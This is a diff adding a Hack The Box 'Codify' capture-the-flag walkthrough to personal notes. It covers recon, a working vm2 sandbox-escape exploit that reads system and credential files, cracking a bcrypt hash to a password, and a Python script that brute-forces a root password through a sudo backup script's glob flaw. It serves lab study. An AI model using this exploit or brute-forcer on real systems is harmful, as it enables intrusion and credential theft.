@@ -284,3 +284,102 @@ curl -i -s -k -X $'POST' \
             - [Exploit to obtain PW from dmp](https://sysdig.com/blog/keepass-cve-2023-32784-detection/)
             - [PoC](https://github.com/vdohney/keepass-password-dumper)
 - [pokracovani](https://github.com/rouvinerh/Gitbook/blob/main/writeups/htb-season-2/keeper.md)
+
+## Codify
+### Reco
+- nmap -sVC 10.10.11.239 -Pn
+    - 22 SSH
+    - 80 HTTP (Apache httpd 2.4.52)
+        - redirect http://codify.htb/
+            - add to /etc/hosts
+    - 3000 HTTP (Node.js Express FW)
+
+- dirb http://codify.htb/ /usr/share/wordlists/dirb/common.txt
+    - /about            200
+    - /editor           200
+    - /server-status    403
+    - /limitations      200
+
+- subpage /about
+    - mention about backend JS library for running Sandbox    
+        - vm2
+            - (CVE-2023-29017)[https://github.com/advisories/GHSA-ch3r-j5x3-6q2m]
+                - CVSS score 9.8
+                - hacker could use it to escape the sandbox and execute arbitrary code
+            - allows partial code exec on isolated Node.js servers while securing system resources and externam data from unauthorized access     
+            
+### Weaponisation
+
+
+### Exploitation
+const {VM} = require("vm2");
+const vm = new VM();
+
+const code = `
+aVM2_INTERNAL_TMPNAME = {};
+function stack() {
+    new Error().stack;
+    stack();
+}
+try {
+    stack();
+} catch (a$tmpname) {
+    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('cat /etc/passwd');
+}
+`
+
+console.log(vm.run(code));
+
+
+- OUTPUT:
+    - /etc/passwd list
+- execSync('cd /home && ls')
+    - users: joshua, svc
+- execSync('cd /var/www/contact && cat index.js');
+    - secret: 'G3U9SHG29S872HA028DH278D9178D90A782GH
+
+- execSync('cd /var/www/contact && cat tickets.db');
+    - joshua credentials w hash
+        - joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
+            - hashcat -a 0 -m 3200 hash.txt /home/zihuatanejo/Desktop/rockyou.txt -w 3
+                - PW: spongebob1
+
+### User flag
+- ssh joshua@10.10.11.239
+    - PW: spongebob1
+    - ls && cat user.txt
+    
+### Root flag
+- cd /opt/scripts && ls
+    - cat mysql-backup.sh
+        - vuln backup script from mysql DB asking for root PW
+- python script for guessing PW char by char, trying to sudo the db.sh file
+-----------------------
+import string
+import subprocess
+all = list(string.ascii_letters + string.digits)
+password = ""
+found = False
+
+while not found:
+    for character in all:
+        command = f"echo '{password}{character}*' | sudo /opt/scripts/mysql-backup.sh"
+        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True).stdout
+
+        if "Password confirmed!" in output:
+            password += character
+            print(password)
+            break
+    else:
+        found = True
+-----------------------
+
+- python3 script.py
+    - PW: kljh12k3jhaskjh12kjh3
+- sudo /opt/scripts/mysql-backup.sh
+    - PW
+    - *Changing the permissions...Done!*
+- su root
+    - PW
+    - cd /root && ls
+    - cat root.txt
